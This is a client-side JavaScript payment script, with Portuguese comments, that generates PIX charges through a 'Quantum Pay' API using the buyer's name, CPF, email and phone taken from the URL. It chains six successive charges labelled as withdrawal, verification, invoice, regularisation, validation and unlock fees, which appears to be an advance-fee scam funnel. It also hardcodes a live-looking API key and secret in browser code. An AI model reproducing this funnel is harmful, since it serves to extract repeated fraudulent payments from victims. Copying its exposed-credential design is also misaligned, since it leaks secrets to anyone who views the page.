    <script>
        // ══════════════════════════════════════════════════════════════
        // QUANTUM PAY - INTEGRAÇÃO DIRETA (SEM PHP)
        // ══════════════════════════════════════════════════════════════
        const QUANTUM_API_KEY = 'cmn9t7wf6000e1a6ldwyy5ufb';
        const QUANTUM_API_SECRET = '3db93a9d0b6c5a65eb9972d88218777f07457a8f686426135644ebe255b4cf7a3f116cfa66d786e5c509590d0b4562a93697390a124dc6ef28a89a9e83ee82613ac16cd3da3ab7924985240ea8edfb19272a9fcbf3a35af0d09500b47f9e9088005f6f9b59d860f4a7b32c55a7062b696969283942a2deafb1029f8ae6b64142';
        const QUANTUM_BASE_URL = 'https://api.quantumpay.com.br';

        const urlParams = new URLSearchParams(window.location.search);

        // Captura dados do lead
        const valor = parseInt(urlParams.get('valor') || '6990');
        const nome = urlParams.get('nome') || urlParams.get('name') || 'Cliente';
        const cpf = (urlParams.get('cpf') || urlParams.get('document') || '').replace(/\D/g, '');
        const email = urlParams.get('email') || 'cliente@email.com';
        const telefone = (urlParams.get('telefone') || urlParams.get('telephone') || '11999999999').replace(/\D/g, '');
        const currentUpsell = urlParams.get('from_upsell') || '0';

        // Proteção contra PIX duplicado
        let isGenerating = false;
        const PIX_STORAGE_KEY = 'pixUpsell_' + cpf + '_up' + currentUpsell;

        // Descrição dinâmica baseada no upsell
        const descriptions = {
          '0': 'Taxa de Saque',
          '1': 'Taxa de Verificação',
          '2': 'TENF - Taxa Nota Fiscal',
          '3': 'Taxa de Regularização',
          '4': 'Validação Final',
          '5': 'Taxa de Desbloqueio'
        };
        const pixDescription = descriptions[currentUpsell] || 'Taxa de Processamento';

        let transactionId = null;
        let checkInterval = null;

        function showPixResult(code, img) {
          document.getElementById('pix-code-input').value = code;
          document.getElementById('qr-code-image').src = img 
            ? (img.startsWith('data:') ? img : 'data:image/png;base64,' + img)
            : 'https://api.qrserver.com/v1/create-qr-code/?size=220x220&data=' + encodeURIComponent(code);
          
          document.getElementById('loading-screen').classList.add('hidden');
          document.getElementById('payment-screen').classList.remove('hidden');
        }

        async function generatePix() {
          // Guard 1: já gerando
          if (isGenerating) return;

          // Guard 2: cache da sessão
          var cached = sessionStorage.getItem(PIX_STORAGE_KEY);
          if (cached) {
            try {
              var data = JSON.parse(cached);
              console.log('[PIX Upsell] Usando cache da sessão');
              showPixResult(data.code, data.img);
              if (data.transactionId) {
                transactionId = data.transactionId;
                startPaymentCheck();
              }
              return;
            } catch(e) {
              sessionStorage.removeItem(PIX_STORAGE_KEY);
            }
          }

          isGenerating = true;

          try {
            // 1. Autenticação
            const credentials = btoa(QUANTUM_API_KEY.trim() + ':' + QUANTUM_API_SECRET.trim());
            const authRes = await fetch(QUANTUM_BASE_URL + '/api/auth', {
              method: 'POST',
              headers: { 'Authorization': 'Basic ' + credentials, 'Accept': 'application/json' }
            });
            const authData = await authRes.json();
            if (!authRes.ok) throw new Error(authData.message || 'Falha na autenticação');

            const token = authData.token || (authData.data && authData.data.token);

            // 2. Gera PIX
            const pixRes = await fetch(QUANTUM_BASE_URL + '/api/v1/pix/in/qrcode', {
              method: 'POST',
              headers: { 'Authorization': 'Bearer ' + token, 'Content-Type': 'application/json' },
              body: JSON.stringify({
                amountInCents: valor,
                description: pixDescription,
                customer: {
                  name: nome,
                  email: email,
                  document: cpf,
                  documentType: 'cpf',
                  phone: telefone
                }
              })
            });

            const pixData = await pixRes.json();
            if (!pixRes.ok) throw new Error(pixData.message || 'Falha ao gerar PIX');

            const d = pixData.data || pixData;
            const code = d.pix?.emv || d.pix_code || d.copia_cola;
            const img = d.pix?.qrCode || d.image_base64;
            transactionId = d.id || d.transaction_id || d.transactionId || null;

            if (!code) throw new Error('Código PIX não recebido.');

            // Salva no cache
            sessionStorage.setItem(PIX_STORAGE_KEY, JSON.stringify({
              code: code,
              img: img,
              transactionId: transactionId
            }));

            showPixResult(code, img);

            // 3. Inicia polling de status
            if (transactionId) {
              startPaymentCheck();
            }

          } catch (e) {
            console.error('[PIX Upsell] Erro:', e);
            document.getElementById('loading-screen').classList.add('hidden');
            document.getElementById('error-screen').classList.remove('hidden');
            document.getElementById('error-msg').textContent = e.message || 'Erro ao processar pagamento';
          } finally {
            isGenerating = false;
          }
        }

        // Polling de status da transação via Quantum Pay
        function startPaymentCheck() {
          if (checkInterval) clearInterval(checkInterval);

          checkInterval = setInterval(async function() {
            if (!transactionId) return;

            try {
              const credentials = btoa(QUANTUM_API_KEY.trim() + ':' + QUANTUM_API_SECRET.trim());
              const authRes = await fetch(QUANTUM_BASE_URL + '/api/auth', {
                method: 'POST',
                headers: { 'Authorization': 'Basic ' + credentials, 'Accept': 'application/json' }
              });
              const authData = await authRes.json();
              if (!authRes.ok) return;

              const token = authData.token || (authData.data && authData.data.token);

              const statusRes = await fetch(QUANTUM_BASE_URL + '/api/v1/pix/in/' + transactionId, {
                method: 'GET',
                headers: { 'Authorization': 'Bearer ' + token, 'Accept': 'application/json' }
              });
              const statusData = await statusRes.json();
              const d = statusData.data || statusData;
              const status = (d.status || '').toLowerCase();

              if (status === 'paid' || status === 'approved' || status === 'completed') {
                clearInterval(checkInterval);
                console.log('[PIX Upsell] ✅ Pagamento aprovado!');
                redirectToNextUpsell();
              }
            } catch(err) {
              console.error('[PIX Upsell] Erro no polling:', err);
            }
          }, 3000);
        }

        // Redirecionamento pro próximo upsell após pagamento aprovado
        function redirectToNextUpsell() {
          const upsellMap = {
            '0': { next: 'upsell1', value: '7500' },
            '1': { next: 'upsell2', value: '3297' },
            '2': { next: 'upsell3', value: '2370' },
            '3': { next: 'upsell4', value: '4237' },
            '4': { next: 'upsell5', value: '4730' },
            '5': { next: 'obrigado', value: '0' }
          };

          const config = upsellMap[currentUpsell] || { next: 'upsell1', value: '7500' };

          // Coleta UTMs e dados do lead
          const newParams = new URLSearchParams();
          
          // Repassa nome, cpf, email, telefone
          if (nome) newParams.set('name', nome);
          if (cpf) newParams.set('cpf', cpf);
          if (email && email !== 'cliente@email.com') newParams.set('email', email);
          if (telefone && telefone !== '11999999999') newParams.set('telephone', telefone);

          // Repassa UTMs
          ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','src','sck','xcod','fbclid','gclid','ttclid'].forEach(function(k) {
            var v = urlParams.get(k);
            if (v) newParams.set(k, v);
          });

          newParams.set('from_upsell', String(parseInt(currentUpsell) + 1));
          newParams.set('valor', config.value);

          // Limpa cache do PIX desse upsell
          sessionStorage.removeItem(PIX_STORAGE_KEY);

          const redirectUrl = '../' + config.next + '/index.html?' + newParams.toString();
          console.log('[PIX Upsell] ➡️ Redirecionando para:', redirectUrl);
          window.location.href = redirectUrl;
        }

        // Copiar código PIX
        document.getElementById('copy-pix-button').addEventListener('click', function() {
          const pixCodeInput = document.getElementById('pix-code-input');
          if (pixCodeInput.value) {
            navigator.clipboard.writeText(pixCodeInput.value).then(function() {
              var btn = document.getElementById('copy-pix-button');
              var original = btn.innerHTML;
              btn.innerHTML = '<span class="flex items-center gap-4 text-lg font-semibold text-white">✓ Código copiado!</span>';
              setTimeout(function() { btn.innerHTML = original; }, 2000);
            });
          }
        });

        // Proteção bfcache
        window.addEventListener('pageshow', function(e) {
          if (e.persisted) {
            var cached = sessionStorage.getItem(PIX_STORAGE_KEY);
            if (cached) {
              try {
                var data = JSON.parse(cached);
                showPixResult(data.code, data.img);
              } catch(err) {}
            }
          }
        });

        // Gera ao carregar
        window.addEventListener('DOMContentLoaded', generatePix);
    </script>
